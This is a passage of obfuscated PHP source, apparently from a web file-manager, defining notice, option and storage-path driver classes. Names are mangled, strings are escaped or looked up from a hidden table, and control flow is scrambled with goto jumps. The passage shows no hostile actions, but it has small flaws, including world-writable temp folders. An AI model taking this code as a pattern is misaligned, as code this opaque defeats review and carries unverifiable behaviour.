unset($E¾Í³‹Ù†¬[$bŒ•öÛ‚‰Ô[2049]]); $aæõˆİÙ³ = $this->deviceType($E¾Í³‹Ù†¬[$bŒ•öÛ‚‰Ô[1873]]); if (isset($E§ˆ´ÛîÅ‰[$aæõˆİÙ³])) { continue; } goto D¦»Œ¼†ÖÆ; EÄ˜¿Çåˆ: if ($BƒàÃ¿¨ŒÆ > 0 && abs($CÒÂó£Ò½´[$bŒ•öÛ‚‰Ô[192]] - $E›õ¬Ğ³…÷[$BƒàÃ¿¨ŒÆ - 1][$bŒ•öÛ‚‰Ô[192]]) < 5) { continue; } $E¾Í³‹Ù†¬ = json_decode($CÒÂó£Ò½´[$bŒ•öÛ‚‰Ô[431]], !0); $CÒÂó£Ò½´[$bŒ•öÛ‚‰Ô[2049]] = isset($E¾Í³‹Ù†¬[$bŒ•öÛ‚‰Ô[2049]]) ? $E¾Í³‹Ù†¬[$bŒ•öÛ‚‰Ô[2049]] : $bŒ•öÛ‚‰Ô[33]; goto Aáç¸°ªĞ‰; D¦»Œ¼†ÖÆ: $this->ipAddress($CÒÂó£Ò½´); $CÒÂó£Ò½´[$bŒ•öÛ‚‰Ô[431]] = $E¾Í³‹Ù†¬; $E§ˆ´ÛîÅ‰[$aæõˆİÙ³] = $CÒÂó£Ò½´; goto D“µ™Ÿ£Ëç; D“µ™Ÿ£Ëç: } return array_values($E§ˆ´ÛîÅ‰); } public function deviceType($Eˆï¯Æá¼Ò) { return $Eˆï¯Æá¼Ò; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\x6e\x6f\x74\151\x63\145\x4c\x69\163\x74"; public $field = array("\156\x61\155\145", "\143\x6f\x6e\164\145\156\x74", "\141\x75\x74\150", "\155\157\144\x65", "\x74\151\155\145", "\164\171\x70\x65", "\x6c\x65\x76\x65\x6c", "\145\x6e\x61\x62\x6c\x65", "\163\x6f\x72\x74"); public function listData($fã«Õ±Ä…÷ = false, $B’ˆ£Ü¾‘ = "\163\x6f\x72\164", $A…¤§¹´² = false) { return parent::listData($fã«Õ±Ä…÷, $B’ˆ£Ü¾‘, $A…¤§¹´²); } public function add($EÕ÷–éÊÀ) { $fÓ›—š°ìÒ =& $_SERVER[¢ÌÛ]; $aõöƒè«°Á = time(); if ($EÕ÷–éÊÀ[$fÓ›—š°ìÒ[12]] == $fÓ›—š°ìÒ[2058]) { $aõöƒè«°Á = strtotime($EÕ÷–éÊÀ[$fÓ›—š°ìÒ[195]]); } $EÕ÷–éÊÀ[$fÓ›—š°ìÒ[195]] = $aõöƒè«°Á; return parent::insert($EÕ÷–éÊÀ); } public function update($Dô‡ŠˆÎº‡, $BİŸ£Õ­à…) { goto e©‰ÆÓÚ; dêƒ™²óØÖ: $Eø÷å†§øÔ = time(); if ($BİŸ£Õ­à…[$AÉŞÓªÍ…[12]] == $AÉŞÓªÍ…[2058]) { $Eø÷å†§øÔ = strtotime($BİŸ£Õ­à…[$AÉŞÓªÍ…[195]]); } $BİŸ£Õ­à…[$AÉŞÓªÍ…[195]] = $Eø÷å†§øÔ; goto aÊñ´ˆÉö; e©‰ÆÓÚ: $AÉŞÓªÍ… =& $_SERVER[¢ÌÛ]; $d£ğ¼Ââ = $this->listData($Dô‡ŠˆÎº‡); if (!$d£ğ¼Ââ) { return !1; } goto dêƒ™²óØÖ; aÊñ´ˆÉö: return parent::update($Dô‡ŠˆÎº‡, $BİŸ£Õ­à…); goto fæäÍ³ÁŒì; fæäÍ³ÁŒì: } public function remove($bŞ…¦ÍåÈ) { $b¶ÄõæÚ = $this->listData($bŞ…¦ÍåÈ); if (!$b¶ÄõæÚ || $b¶ÄõæÚ[$_SERVER[¢ÌÛ][1142]]) { return !1; } return parent::remove($bŞ…¦ÍåÈ); } public function sort($c‚»£‡ñí¨, $eÃ¸¿±Éá) { return parent::update($c‚»£‡ñí¨, $eÃ¸¿±Éá); } public function enable($déò¨­Ïê×, $EÃíæÛ¾) { return parent::update($déò¨­Ïê×, array($_SERVER[¢ÌÛ][2059] => $EÃíæÛ¾)); } private function initUserOption() { $c…Ä˜ì¦Ğ‘ =& $_SERVER[¢ÌÛ]; $this->optionType = $c…Ä˜ì¦Ğ‘[2060]; $this->modelType = $c…Ä˜ì¦Ğ‘[2061]; $this->field = array($c…Ä˜ì¦Ğ‘[2062], $c…Ä˜ì¦Ğ‘[28], $c…Ä˜ì¦Ğ‘[195], $c…Ä˜ì¦Ğ‘[29], $c…Ä˜ì¦Ğ‘[2063], $c…Ä˜ì¦Ğ‘[712], $c…Ä˜ì¦Ğ‘[189]); } public function userNoticeGet($dÒ®Ò§Í = false) { $this->initUserOption(); return parent::listData($dÒ®Ò§Í, $_SERVER[¢ÌÛ][385], !0); } public function userNoticeAdd($eŞ’Ú–ê¬•) { $B¤²Î°öÏ¢ =& $_SERVER[¢ÌÛ]; $this->initUserOption(); $DâÌ²Û³ô¯ = $this->findByKey($B¤²Î°öÏ¢[2062], $eŞ’Ú–ê¬•[$B¤²Î°öÏ¢[385]]); if ($DâÌ²Û³ô¯) { return !0; } $d¯È‚ç œ = array($B¤²Î°öÏ¢[2062] => $eŞ’Ú–ê¬•[$B¤²Î°öÏ¢[385]], $B¤²Î°öÏ¢[28] => $eŞ’Ú–ê¬•[$B¤²Î°öÏ¢[28]], $B¤²Î°öÏ¢[195] => $eŞ’Ú–ê¬•[$B¤²Î°öÏ¢[195]], $B¤²Î°öÏ¢[29] => isset($eŞ’Ú–ê¬•[$B¤²Î°öÏ¢[29]]) ? $eŞ’Ú–ê¬•[$B¤²Î°öÏ¢[29]] : 1, $B¤²Î°öÏ¢[2063] => isset($eŞ’Ú–ê¬•[$B¤²Î°öÏ¢[2063]]) ? $eŞ’Ú–ê¬•[$B¤²Î°öÏ¢[2063]] : 0, $B¤²Î°öÏ¢[712] => 0, $B¤²Î°öÏ¢[189] => 0); return parent::insert($d¯È‚ç œ); } public function userNoticeEdit($BÀÆÕ—Ğ°á, $CÏÄÄÔ¾™“) { $this->initUserOption(); return parent::update($BÀÆÕ—Ğ°á, $CÏÄÄÔ¾™“); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\155\x5f\157\x70\x74\x69\x6f\x6e"; protected $jsonField = array("\155\145\x6e\165", "\162\x6f\154\x65", "\162\157\x6c\x65\x47\162\157\165\160", "\162\145\147\151\x73\x74", "\x65\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($b¡ëªĞİ) { return "\x53\x79\163\164\x65\x6d\117\x70\164\151\157\156\137{$b¡ëªĞİ}"; } protected function optionDefault($cˆªğÌ„â” = '') { $c‚õ·¶‡ä¢ =& $_SERVER[¢ÌÛ]; if ($cˆªğÌ„â” == $c‚õ·¶‡ä¢[33]) { return $GLOBALS[$c‚õ·¶‡ä¢[6]][$c‚õ·¶‡ä¢[373]]; } } } goto bÖªàâù­è; F‡å‡‡ñ«Ú: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $BÏ¹À†ø¨– =& $_SERVER[¢ÌÛ]; $this->objectDriver = array($BÏ¹À†ø¨–[57], $BÏ¹À†ø¨–[58], $BÏ¹À†ø¨–[59], $BÏ¹À†ø¨–[60], $BÏ¹À†ø¨–[61], $BÏ¹À†ø¨–[62], $BÏ¹À†ø¨–[63], $BÏ¹À†ø¨–[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($e¤§Æ‘ƒ¶) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($e¤§Æ‘ƒ¶, $_SERVER[¢ÌÛ][8]); } return $e¤§Æ‘ƒ¶; } public function iconvApp($dª´Œ›…É¦) { return $dª´Œ›…É¦; } public function iconvSystem($F†òéÍ‹Î») { return $F†òéÍ‹Î»; } public function iconvTo($Aì¹©Şßì, $d“ŠÑ—Ò­ç, $C‰²¡±’’ô) { goto Fæ—ˆĞ¶; Fæ—ˆĞ¶: $a‘Àöµšã =& $_SERVER[¢ÌÛ]; if (!$Aì¹©Şßì || !function_exists($a‘Àöµšã[65])) { return $Aì¹©Şßì; } static $DÕóÄçßô = array(); goto côŒ›‡¤´ö; Bœà¬Ÿù’à: $C–£ÙÄ‰ùÖ = $C–£ÙÄ‰ùÖ ? $C–£ÙÄ‰ùÖ : $Aì¹©Şßì; if (strstr($C–£ÙÄ‰ùÖ, $a‘Àöµšã[69])) { $C–£ÙÄ‰ùÖ = str_replace($a‘Àöµšã[69], $a‘Àöµšã[70], $C–£ÙÄ‰ùÖ); } $DÕóÄçßô[$d“ŠÑ—Ò­ç . $a‘Àöµšã[66] . $C‰²¡±’’ô . $a‘Àöµšã[67] . $Aì¹©Şßì] = $C–£ÙÄ‰ùÖ; goto f¿¸‚éÓ“Õ; f¿¸‚éÓ“Õ: $DÕóÄçßô[$C‰²¡±’’ô . $a‘Àöµšã[66] . $d“ŠÑ—Ò­ç . $a‘Àöµšã[67] . $Aì¹©Şßì] = $Aì¹©Şßì; $DÕóÄçßô[$C‰²¡±’’ô . $a‘Àöµšã[66] . $d“ŠÑ—Ò­ç . $a‘Àöµšã[67] . $C–£ÙÄ‰ùÖ] = $Aì¹©Şßì; $DÕóÄçßô[$d“ŠÑ—Ò­ç . $a‘Àöµšã[66] . $C‰²¡±’’ô . $a‘Àöµšã[67] . $C–£ÙÄ‰ùÖ] = $C–£ÙÄ‰ùÖ; goto CôÎÙÇ°ø; CôÎÙÇ°ø: return $C–£ÙÄ‰ùÖ; goto b®‰¹êÙÛÚ; côŒ›‡¤´ö: $CÅ¶½¼µñš = $d“ŠÑ—Ò­ç . $a‘Àöµšã[66] . $C‰²¡±’’ô . $a‘Àöµšã[67] . $Aì¹©Şßì; if (isset($DÕóÄçßô[$CÅ¶½¼µñš])) { return $DÕóÄçßô[$CÅ¶½¼µñš]; } if (function_exists($a‘Àöµšã[68])) { $C–£ÙÄ‰ùÖ = @mb_convert_encoding($Aì¹©Şßì, $C‰²¡±’’ô, $d“ŠÑ—Ò­ç); } else { $C–£ÙÄ‰ùÖ = @iconv($d“ŠÑ—Ò­ç, $C‰²¡±’’ô, $Aì¹©Şßì); } goto Bœà¬Ÿù’à; b®‰¹êÙÛÚ: } public function getPathInner($EËç×ö–Ÿ‡) { $FİäÂ¹äê¾ = IO::init($EËç×ö–Ÿ‡); return $FİäÂ¹äê¾->path; } public function getPathOuter($a–“Æ¡÷–Ğ) { $E‘ÛÕ³ƒ Ò =& $_SERVER[¢ÌÛ]; $Bæáî«„ = strlen(trim($this->pathBase, $E‘ÛÕ³ƒ Ò[8])); $a–“Æ¡÷–Ğ = substr(trim($a–“Æ¡÷–Ğ, $E‘ÛÕ³ƒ Ò[8]), $Bæáî«„); return $this->pathDriver . $E‘ÛÕ³ƒ Ò[8] . ltrim($a–“Æ¡÷–Ğ, $E‘ÛÕ³ƒ Ò[8]); } public function isParentOf($AÑ‰À„Å×, $AÔÙ‘§éèÛ) { $Bß¹æ¬Î…è =& $_SERVER[¢ÌÛ]; $AÑ‰À„Å× = rtrim(strtolower($AÑ‰À„Å×), $Bß¹æ¬Î…è[8]) . $Bß¹æ¬Î…è[8]; $AÔÙ‘§éèÛ = rtrim(strtolower($AÔÙ‘§éèÛ), $Bß¹æ¬Î…è[8]) . $Bß¹æ¬Î…è[8]; $c¹Š¸½Ö‰ = strpos($AÔÙ‘§éèÛ, $AÑ‰À„Å×) === 0; return $c¹Š¸½Ö‰; } public function getType() { $BŠ•åö£‘ =& $_SERVER[¢ÌÛ]; $e£±°Ïà‰Ë = str_replace($BŠ•åö£‘[71], $BŠ•åö£‘[33], get_class($this)); return strtolower($e£±°Ïà‰Ë); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($cØÁï‘çá, $b„ô¡Æµ¼) { $c„œ°µÇ¤È =& $_SERVER[¢ÌÛ]; $a×¿ğÖÅç = rtrim($cØÁï‘çá, $c„œ°µÇ¤È[8]) . $c„œ°µÇ¤È[8] . $b„ô¡Æµ¼; $DÂ¨Ó¾Ô¯Ù = $this->exist($a×¿ğÖÅç); return $DÂ¨Ó¾Ô¯Ù ? $a×¿ğÖÅç : !1; } public function setModifyTime($DÙ¨„¯çóÄ, $B¤ŒğÍœà = '') { } public function renameObject($eÏ‘Õå“ƒ¿, $e…„‰×¢”õ) { goto b­´å…Ç©; dî­‘Ô÷ÑÍ: return $Bèîğ²åá‚ ? $e…„‰×¢”õ : !1; goto AÜ¤«µÒ; dğÄ¡›ÁĞä: $eÏ‘Õå“ƒ¿ = $this->getPathOuter($eÏ‘Õå“ƒ¿); $e…„‰×¢”õ = $this->pathFather($eÏ‘Õå“ƒ¿) . $e…„‰×¢”õ; if (IO::isFile($eÏ‘Õå“ƒ¿)) { $Bèîğ²åá‚ = IO::copy($eÏ‘Õå“ƒ¿, $this->pathFather($eÏ‘Õå“ƒ¿), REPEAT_RENAME_FOLDER, $b–ÂŸíóìç); if ($Bèîğ²åá‚) { IO::remove($eÏ‘Õå“ƒ¿); } } else { $Bèîğ²åá‚ = IO::mkdir($e…„‰×¢”õ); if (!$Bèîğ²åá‚) { return !1; } $dÑöÔŠ¤áÍ = IO::listPath($eÏ‘Õå“ƒ¿, !0); $b½šª¦ó‰ = array_merge($dÑöÔŠ¤áÍ[$bª› —§à¸[73]], $dÑöÔŠ¤áÍ[$bª› —§à¸[74]]); foreach ($b½šª¦ó‰ as $e¶¥¨÷Öó™) { IO::move($e¶¥¨÷Öó™[$bª› —§à¸[75]], $e…„‰×¢”õ, REPEAT_RENAME_FOLDER); } IO::remove($eÏ‘Õå“ƒ¿); } goto dî­‘Ô÷ÑÍ; b­´å…Ç©: $bª› —§à¸ =& $_SERVER[¢ÌÛ]; $b–ÂŸíóìç = $e…„‰×¢”õ; Hook::trigger($bª› —§à¸[72], $this, $eÏ‘Õå“ƒ¿, $this, $this->pathFather($eÏ‘Õå“ƒ¿) . $e…„‰×¢”õ); goto dğÄ¡›ÁĞä; AÜ¤«µÒ: } public function tempFile($c‹©‹Ì‹‹© = '', $B–Ö®êÄ½… = '') { goto dœš©÷ìªÉ; dœš©÷ìªÉ: if (!$c‹©‹Ì‹‹©) { $c‹©‹Ì‹‹© = rand_string(15); } $EÆî¯Û¿í = TEMP_FILES . rand_string(15) . $_SERVER[¢ÌÛ][8]; @mkdir($EÆî¯Û¿í, 511, !0); goto fËÆøãäà‡; fËÆøãäà‡: $BÃòÈÏŒõ³ = $EÆî¯Û¿í . $c‹©‹Ì‹‹©; @touch($BÃòÈÏŒõ³); if ($B–Ö®êÄ½…) { file_put_contents($BÃòÈÏŒõ³, $B–Ö®êÄ½…); } goto fˆ”‡îÀÆ; fˆ”‡îÀÆ: return $BÃòÈÏŒõ³; goto b¢Ù®‰îîİ; b¢Ù®‰îîİ: } public function tempFileRemve($fíÁ‘×‹ª–) { @unlink($fíÁ‘×‹ª–); @rmdir($this->pathFather($fíÁ‘×‹ª–)); } public function mkfile($bÆ£É©§Ÿ†, $C»À¡–óˆ¯ = '', $d¤ã™£Â´ = REPEAT_RENAME) { } public function mkdir($Fğ²±£Õ, $f­ÛÂÙ²¡¹ = REPEAT_SKIP) { } public function delFile($Fœ¸­—‚) { } public function delFolder($Cì¢Ü¹Âİ) { } public function copyFile($f†¨ã‚ÜŒ¬, $cîŒ™‰¤Œ) { } public function moveFile($B¹ßùºÀéö, $CÄ˜ôóË¸ä) { } public function remove($eŞ…‹÷Â¤Ë) { if ($this->isFile($eŞ…‹÷Â¤Ë)) { return $this->delFile($eŞ…‹÷Â¤Ë); } return $this->delFolder($eŞ…‹÷Â¤Ë); } public function rename($cøÙîñÉ, $EŒ—ÓæÃ¸ƒ) { } public function exist($B°ÀÕÅ´ê) { } public function findByHash($FÒâ’î¢·µ = '', $A¼ÁÛ½ÆÊ· = '') { return !1; } public function isFile($A¹ìÓ®¥£) { } public function isFolder($b˜ËÅé‹Ş) { } public function size($EõèÌõ°°¢) { } public function info($dêöÖñµ–Ï) { } public function infoSimple($cƒ‹Í²èÖå) { return $this->info($cƒ‹Í²èÖå); } public function infoAuth($f±®­„²Ä) { return $this->info($f±®­„²Ä); } public function infoFull($Bª˜¨âË©) { return $this->info($Bª˜¨âË©); } public function infoWithChildren($EšéÓÇ¾Šö) { $d½ŠÖÚÜÊ =& $_SERVER[¢ÌÛ]; static $D—ÎÓŸÙÕ† = array(); if (isset($D—ÎÓŸÙÕ†[$EšéÓÇ¾Šö])) { return $D—ÎÓŸÙÕ†[$EšéÓÇ¾Šö]; } $b¢¨“¼Ö»õ = $this->info($EšéÓÇ¾Šö); if ($b¢¨“¼Ö»õ && $b¢¨“¼Ö»õ[$d½ŠÖÚÜÊ[29]] == $d½ŠÖÚÜÊ[76]) { $BÆŠŠ ÏŠ = array($d½ŠÖÚÜÊ[77] => 0, $d½ŠÖÚÜÊ[78] => 0, $d½ŠÖÚÜÊ[79] => 0); $this->infoChildren($EšéÓÇ¾Šö, $BÆŠŠ ÏŠ); $b¢¨“¼Ö»õ[$d½ŠÖÚÜÊ[77]] = $BÆŠŠ ÏŠ[$d½ŠÖÚÜÊ[77]]; $b¢¨“¼Ö»õ[$d½ŠÖÚÜÊ[80]] = array($d½ŠÖÚÜÊ[81] => $BÆŠŠ ÏŠ[$d½ŠÖÚÜÊ[78]], $d½ŠÖÚÜÊ[82] => $BÆŠŠ ÏŠ[$d½ŠÖÚÜÊ[79]]); $D—ÎÓŸÙÕ†[$EšéÓÇ¾Šö] = $b¢¨“¼Ö»õ; } return $b¢¨“¼Ö»õ; } public function listPath($aİî›À×­, $B´Šõ™í = false) { } public function has($eù¥šÎ¨¸, $eÉğ¯¤´¨Ö = false, $b´¹Üİ‘¢À = false) { } public function canRead($AŠ¸­ø„ÛÄ) { } public function canWrite($D £æÎä) { } public function getContent($c‹ëóğáé) { } public function setContent($AøšÛÚáš, $D£Í¥½êÑ = '') { } protected function infoChildren($Fá‚“©¨‡™, &$BóÆæ®­Ç­) { $d²Ğóê¡ÉÇ =& $_SERVER[¢ÌÛ]; check_abort_echo(); $c»µ¹ÆÊİ© = $this->listPath($Fá‚“©¨‡™, !0); $c»µ¹ÆÊİ© = array_merge($c»µ¹ÆÊİ©[$d²Ğóê¡ÉÇ[74]], $c»µ¹ÆÊİ©[$d²Ğóê¡ÉÇ[73]]); foreach ($c»µ¹ÆÊİ© as $A«Ã½…Ç‹ã) { if ($A«Ã½…Ç‹ã[$d²Ğóê¡ÉÇ[29]] == $d²Ğóê¡ÉÇ[76]) { $BóÆæ®­Ç­[$d²Ğóê¡ÉÇ[79]]++; $e×Ü‡ßìä = $this->getPathInner($A«Ã½…Ç‹ã[$d²Ğóê¡ÉÇ[75]]); $this->infoChildren($e×Ü‡ßìä, $BóÆæ®­Ç­); } else { $BóÆæ®­Ç­[$d²Ğóê¡ÉÇ[78]]++; $BóÆæ®­Ç­[$d²Ğóê¡ÉÇ[77]] += $A«Ã½…Ç‹ã[$d²Ğóê¡ÉÇ[77]]; } } } public function fileSubstr($D©âĞÅŸ«, $E‚ãßóËä†, $aÜ÷™èâ) { } public function listAll($aíëªïº™¥) { } public function listAllMake($B¿ğ–·Éƒ, &$BÃœ„‡íƒ) { $d‚š‡¡ç–Õ =& $_SERVER[¢ÌÛ]; check_abort_echo(); $d¥½ä¸¥•‡ = $this->listPath($B¿ğ–·Éƒ, !0); if (!$d¥½ä¸¥•‡) { return; } $BøŠß»‡ = array_merge($d¥½ä¸¥•‡[$d‚š‡¡ç–Õ[74]], $d¥½ä¸¥•‡[$d‚š‡¡ç–Õ[73]]); foreach ($BøŠß»‡ as $Dì£¢Ï‚¹) { goto fÆô äÉäÂ; DÔâë×´Ù: $this->listAllMake($Dì£¢Ï‚¹[$d‚š‡¡ç–Õ[75]], $BÃœ„‡íƒ); goto E°×¢‘™á; C‚‡É§‡í‰: if (isset($Dì£¢Ï‚¹[$d‚š‡¡ç–Õ[83]])) { $C‚ñïƒ‚Ï[$d‚š‡¡ç–Õ[83]] = $Dì£¢Ï‚¹[$d‚š‡¡ç–Õ[83]]; } if (!$cš’Õ¹®“) { $BÃœ„‡íƒ[] = $C‚ñïƒ‚Ï; continue; } $BÃœ„‡íƒ[] = $C‚ñïƒ‚Ï; goto DÔâë×´Ù; fÆô äÉäÂ: $cš’Õ¹®“ = $Dì£¢Ï‚¹[$d‚š‡¡ç–Õ[29]] == $d‚š‡¡ç–Õ[76]; $C‚ñïƒ‚Ï = array($d‚š‡¡ç–Õ[75] => $Dì£¢Ï‚¹[$d‚š‡¡ç–Õ[75]], $d‚š‡¡ç–Õ[76] => $cš’Õ¹®“); if (isset($Dì£¢Ï‚¹[$d‚š‡¡ç–Õ[77]])) { $C‚ñïƒ‚Ï[$d‚š‡¡ç–Õ[77]] = $Dì£¢Ï‚¹[$d‚š‡¡ç–Õ[77]]; } goto C‚‡É§‡í‰; E°×¢‘™á: } } public function listAllSimple($bƒŞïÊ«†Ü) { $b‚ô«¹‡è =& $_SERVER[¢ÌÛ]; $f•’µÌâöƒ = array(); $D¦ÚíÁº¥Â = $this->listAll($bƒŞïÊ«†Ü); $fÙ¦À‚§… = $this->getPathOuter($bƒŞïÊ«†Ü); foreach ($D¦ÚíÁº¥Â as $f¹Û­æ·ÎÓ) { goto DÁ¨é†£; FÄ”Ş¥‰½í: $D‚¤µŸ °¡ = array($b‚ô«¹‡è[75] => $F‹ªæ­¶Şá, $b‚ô«¹‡è[76] => $f¹Û­æ·ÎÓ[$b‚ô«¹‡è[76]]); if (isset($f¹Û­æ·ÎÓ[$b‚ô«¹‡è[77]]) && !$f¹Û­æ·ÎÓ[$b‚ô«¹‡è[76]]) { $D‚¤µŸ °¡[$b‚ô«¹‡è[77]] = $f¹Û­æ·ÎÓ[$b‚ô«¹‡è[77]]; } if (isset($f¹Û­æ·ÎÓ[$b‚ô«¹‡è[83]])) { $D‚¤µŸ °¡[$b‚ô«¹‡è[83]] = $f¹Û­æ·ÎÓ[$b‚ô«¹‡è[83]]; } goto Eß”ÛÍÒ¹¤; DÁ¨é†£: $eÛ„¬Ü¶œ = $f¹Û­æ·ÎÓ[$b‚ô«¹‡è[75]]; $F‹ªæ­¶Şá = $f¹Û­æ·ÎÓ[$b‚ô«¹‡è[75]]; if (isset($f¹Û­æ·ÎÓ[$b‚ô«¹‡è[84]])) { $eÛ„¬Ü¶œ = $f¹Û­æ·ÎÓ[$b‚ô«¹‡è[84]][$b‚ô«¹‡è[75]]; $f¹Û­æ·ÎÓ[$b‚ô«¹‡è[77]] = $f¹Û­æ·ÎÓ[$b‚ô«¹‡è[84]][$b‚ô«¹‡è[77]]; $f¹Û­æ·ÎÓ[$b‚ô«¹‡è[83]] = $f¹Û­æ·ÎÓ[$b‚ô«¹‡è[84]][$b‚ô«¹‡è[83]]; } else { $F‹ªæ­¶Şá = substr($f¹Û­æ·ÎÓ[$b‚ô«¹‡è[75]], strlen(get_path_father($fÙ¦À‚§…))); $F‹ªæ­¶Şá = $b‚ô«¹‡è[8] . ltrim($F‹ªæ­¶Şá, $b‚ô«¹‡è[8]); } goto FÄ”Ş¥‰½í; Eß”ÛÍÒ¹¤: if (!$f¹Û­æ·ÎÓ[$b‚ô«¹‡è[76]]) { $D‚¤µŸ °¡[$b‚ô«¹‡è[85]] = $eÛ„¬Ü¶œ; } $f•’µÌâöƒ[] = $D‚¤µŸ °¡; goto c«ñ²ÅøƒÕ; c«ñ²ÅøƒÕ: } return $f•’µÌâöƒ; } public function upload($f¹»¿ª„Ë°, $a¦ŒÂˆ„, $B¼ÅæÏ¿å£ = false, $eŠº˜’•ƒù = REPEAT_REPLACE) { } public function uploadFileByID($BÃÉîí¤‚, $CËÙÈ»˜†, $Aéö•â‹íê) { } public function uploadFileByPath($a·ŞÜ„“ˆ‡, $E‚ò†åé‹, $aÄÚğÎ­À° = array()) { } public function isUploadServer() { $dÜ’ä§ğùÄ =& $_SERVER[¢ÌÛ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $dÜ’ä§ğùÄ[86]) { return !0; } return $GLOBALS[$dÜ’ä§ğùÄ[6]][$dÜ’ä§ğùÄ[87]][$dÜ’ä§ğùÄ[88]]; } public function isFileOutServer() { $b½õ˜¡ Ìª =& $_SERVER[¢ÌÛ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $b½õ˜¡ Ìª[86]) { return !0; } return $GLOBALS[$b½õ˜¡ Ìª[6]][$b½õ˜¡ Ìª[87]][$b½õ˜¡ Ìª[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($FùÔ…­Ø§‹) { $bß½´ø¢Œ =& $_SERVER[¢ÌÛ]; if (!$this->isCdnHost()) { return $FùÔ…­Ø§‹; } return str_replace(trim(get_url_root($FùÔ…­Ø§‹), $bß½´ø¢Œ[8]), trim($this->cdnHost, $bß½´ø¢Œ[8]), $FùÔ…­Ø§‹); } public function uploadLink($dí…ø“—È“, $AÑ„™°éä÷ = 0) { goto dˆ”‚„¡Æ¹; dˆ”‚„¡Æ¹: $Cñã‚”èŒì =& $_SERVER[¢ÌÛ]; if ($this->isUploadServer()) { return; } $D‡¿ù‰“š™ = $this->getType(); goto Bô¨Ÿ÷œßí; fâ–¿½ãë‚: $BÃÖµŠ¾„‚ = $AÑ„™°éä÷ <= $EƒòØÂ—¥¶ ? $Cñã‚”èŒì[90] : $Cñã‚”èŒì[91]; $f Œ¿¢Ÿî× = (!$AÑ„™°éä÷ ? 1 : ceil($AÑ„™°éä÷ / pow(1024, 3))) * 3600 * 4; $c¨Â»Ö…Ê = $this->{$BÃÖµŠ¾„‚}($dí…ø“—È“, $f Œ¿¢Ÿî×); goto d˜’Æä”¾; Bô¨Ÿ÷œßí: if (!in_array($D‡¿ù‰“š™, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $EƒòØÂ—¥¶ = 1024 * 1024 * 10; goto fâ–¿½ãë‚; d˜’Æä”¾: if ($c¨Â»Ö…Ê) { $c¨Â»Ö…Ê[$Cñã‚”èŒì[92]] = $dí…ø“—È“; $c¨Â»Ö…Ê[$Cñã‚”èŒì[93]] = $D‡¿ù‰“š™; } return $c¨Â»Ö…Ê; goto C›ÜÀó™¥; C›ÜÀó™¥: } public function uploadFormData($e‘¼ß‰¬Ö, $a“•×Û²È« = 3600) { } public function multiUploadFormData($fÄÙ„ßÃœ³, $D·©ø¸ÙÁ = 3600) { } public function download($b¨¦ÉäÓ‡, $B¯ã­öàÎ) { } public function ext($a´£ÎÛÖ³…) { $cÁâ–Îš =& $_SERVER[¢ÌÛ]; if (strpos($a´£ÎÛÖ³…, $cÁâ–Îš[8]) === -1) { $B†Ë‹±İ‚ = $a´£ÎÛÖ³…; } else { $B†Ë‹±İ‚ = $this->pathThis($a´£ÎÛÖ³…); } $d´Ã³ƒÚ– = $cÁâ–Îš[33]; if (strstr($B†Ë‹±İ‚, $cÁâ–Îš[94])) { $d´Ã³ƒÚ– = substr($B†Ë‹±İ‚, strrpos($B†Ë‹±İ‚, $cÁâ–Îš[94]) + 1); $d´Ã³ƒÚ– = strtolower($d´Ã³ƒÚ–); } if (strlen($d´Ã³ƒÚ–) > 3 && preg_match($cÁâ–Îš[95], $d´Ã³ƒÚ–, $dÔÂ‹Âéï‚)) { $d´Ã³ƒÚ– = $cÁâ–Îš[33]; } return $d´Ã³ƒÚ–; } public function pathThis($f«‚ÔÇğé) { $B“åˆ·Ã…‘ =& $_SERVER[¢ÌÛ]; $f«‚ÔÇğé = str_replace($B“åˆ·Ã…‘[96], $B“åˆ·Ã…‘[8], rtrim($f«‚ÔÇğé, $B“åˆ·Ã…‘[8])); $D¹•¾’œÇŒ = strrpos($f«‚ÔÇğé, $B“åˆ·Ã…‘[8]); if ($D¹•¾’œÇŒ === !1) { return $f«‚ÔÇğé; } return substr($f«‚ÔÇğé, $D¹•¾’œÇŒ + 1); } public function pathFather($bÊ½ÀÛÉ¹©) { $F‰™±·º =& $_SERVER[¢ÌÛ]; $bÊ½ÀÛÉ¹© = str_replace($F‰™±·º[96], $F‰™±·º[8], rtrim($bÊ½ÀÛÉ¹©, $F‰™±·º[8])); $bÊŠÏÕ¿ = strrpos($bÊ½ÀÛÉ¹©, $F‰™±·º[8]); if ($bÊŠÏÕ¿ === !1) { return $F‰™±·º[33]; } return substr($bÊ½ÀÛÉ¹©, 0, $bÊŠÏÕ¿ + 1); } public function hashSimple($EïƒöÀØ—„) { goto DˆˆÀÀŞÃ; fÚ¹™Í¦‘×: $b„Â¨É„¡’ = intval($EÌÒ®ï”ä / $B›ÁæÛÅå); $eÛã–…à÷ = $E­ˆ»‹…ù×[33]; for ($AÃê¾ŞÁ„Ñ = 0; $AÃê¾ŞÁ„Ñ < $B›ÁæÛÅå; $AÃê¾ŞÁ„Ñ++) { $eÛã–…à÷ .= $this->fileSubstr($EïƒöÀØ—„, $b„Â¨É„¡’ * $AÃê¾ŞÁ„Ñ, $DÈˆ¢±ïÒÅ); } goto Aò‡À§¾¹; Aò‡À§¾¹: $eÛã–…à÷ .= $this->fileSubstr($EïƒöÀØ—„, $EÌÒ®ï”ä - $DÈˆ¢±ïÒÅ, $DÈˆ¢±ïÒÅ); return md5($eÛã–…à÷) . $EÌÒ®ï”ä; goto cÎŞÀ’›; e£œ¢ŒèÖƒ: $DÈˆ¢±ïÒÅ = 200; $B›ÁæÛÅå = 50; if ($EÌÒ®ï”ä <= $DÈˆ¢±ïÒÅ * $B›ÁæÛÅå) { return $this->hashMd5($EïƒöÀØ—„) . $EÌÒ®ï”ä; } goto fÚ¹™Í¦‘×; DˆˆÀÀŞÃ: $E­ˆ»‹…ù× =& 